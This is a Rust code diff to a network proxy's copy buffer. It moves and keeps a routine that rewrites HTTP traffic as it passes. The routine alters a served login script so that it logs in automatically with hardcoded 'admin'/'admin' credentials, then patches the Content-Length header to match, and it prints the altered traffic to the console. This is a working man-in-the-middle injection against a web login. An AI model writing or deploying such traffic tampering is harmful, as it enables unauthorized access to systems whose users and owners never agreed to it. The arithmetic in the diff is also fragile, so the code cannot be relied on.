@@ -21,18 +21,43 @@ pub(super) struct CopyBuffer {
     pos: usize,
     cap: usize,
     amt: u64,
-    buf: Box<[u8]>,
+    buf: Vec<u8>,
 }
 
 
-fn replace(from: &[u8], to: &[u8], content: &mut Vec<u8>) {
+fn replace(from: &[u8], to: &[u8], content: &mut Vec<u8>, length: usize) {
     let search: Option<usize> = kmp_find(from, &content);
     if let Some(idx) = search {
+        if idx + from.len() >= length || idx + to.len() >= length {
+            return
+        }
         let mut new_vec = Vec::from(&content[0 .. idx]);
         new_vec.extend(to);
         new_vec.extend(&content[idx + from.len() .. ]);
         *content = new_vec;
     }
+}
+
+fn modify_buffer(buffer: &mut Vec<u8>, length: usize) -> isize {
+    let replaces: [[&'static [u8]; 2]; 2] = [
+                    [b"{this._beforeLogin()}", b"{this._beforeLogin();this._onLogin()}"],
+                    [b"s=o.getValue(),r=n.getValue()",b"s='admin',r='admin'"],
+                ];
+
+    let old_length = buffer.len();
+
+    for [from, to] in replaces {
+        replace(from, to, buffer, length);
+    }
+
+    let new_length = buffer.len();
+
+    if new_length != old_length {
+        replace(b"CONTENT-LENGTH: 6236", format!("CONTENT-LENGTH: {}", 6236 + new_length - old_length).as_bytes(), buffer, length + new_length - old_length);
+        println!("come on {} {}", std::str::from_utf8(buffer).unwrap(), std::str::from_utf8(buffer).unwrap());
+    }
+
+    return new_length as isize - old_length as isize;
 }
 
 impl CopyBuffer {
@@ -42,7 +67,8 @@ impl CopyBuffer {
             pos: 0,
             cap: 0,
             amt: 0,
-            buf: vec![0; 65536].into_boxed_slice(),
+            // buf: vec![0; 65536].into_boxed_slice(),
+            buf: vec![0; 65536],
         }
     }
 
@@ -68,7 +94,7 @@ impl CopyBuffer {
                     self.read_done = true;
                 } else {
                     self.pos = 0;
-                    self.cap = n;
+                    self.cap = (modify_buffer(&mut self.buf, n) + n as isize) as usize;
                 }
             }
 
@@ -76,35 +102,16 @@ impl CopyBuffer {
             while self.pos < self.cap {
                 let me = &mut *self;
 
-                let replaces: [[&'static [u8]; 2]; 2] = [
-                    [b"{this._beforeLogin()}", b"{this._beforeLogin();this._onLogin()}"],
-                    [b"s=o.getValue(),r=n.getValue()",b"s='admin',r='admin'"],
-                ];
-
-                let mut buffer = Vec::from(&me.buf[me.pos..me.cap]);
-
-                let old_length = buffer.len();
-
-                for [from, to] in replaces {
-                    replace(from, to, &mut buffer);
-                }
-
-                let new_length = buffer.len();                
-
-                if new_length != old_length {
-                    replace(b"CONTENT-LENGTH: 6236", format!("CONTENT-LENGTH: {}", 6236 + new_length - old_length).as_bytes(), &mut buffer);
-                    println!("come on {} {}", std::str::from_utf8(&me.buf[me.pos..me.cap]).unwrap(), std::str::from_utf8(&buffer).unwrap());
-                }
-
-                let i = ready!(writer.as_mut().poll_write(cx, &buffer))?;
+                let i = ready!(writer.as_mut().poll_write(cx, &me.buf[me.pos..me.cap]))?;
                 if i == 0 {
                     return Poll::Ready(Err(io::Error::new(
                         io::ErrorKind::WriteZero,
                         "write zero byte into writer",
                     )));
                 } else {
-                    self.pos += i + old_length - new_length;
-                    self.amt += (i + old_length - new_length) as u64;
+                    // self.pos += i + old_length - new_length;
+                    self.pos += i;
+                    self.amt += i as u64;
                 }
             }
 
